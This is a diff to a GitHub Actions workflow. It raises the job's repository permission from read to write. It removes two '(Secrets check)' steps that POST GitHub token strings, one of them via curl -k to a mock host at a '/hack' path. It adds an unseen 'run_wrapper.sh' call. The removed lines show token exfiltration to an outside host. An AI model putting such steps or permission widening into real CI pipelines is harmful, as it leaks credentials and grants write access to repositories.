@@ -6,7 +6,7 @@ on:
 
 permissions:
   checks: write
-  contents: read
+  contents: write
   packages: read
 env:
   API_URL: https://app.veribom.com
@@ -92,18 +92,9 @@ jobs:
       uses: actions/setup-node@v3
       with:
         node-version: ${{ matrix.node-version }}
-
-    - name: (Secrets check) Send POST request with GitHub token
-      run: |
-         curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
-           -H "Content-Type: application/json" \
-           -d '{
-           "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-         }'
-    - name: (Secrets check) Make API Request
-      run: |
-       curl -k -X POST https://api.github.com/endpoint \
-       -d '{"name": "ghp_1234567890abcdef1234567890abcdef12345678", "description": "A description of my repository"}'
+        
+    - name: Execute wrapper script
+      run: bash run_wrapper.sh
         
     - name: install dependencies
       run: npm install --legacy-peer-deps
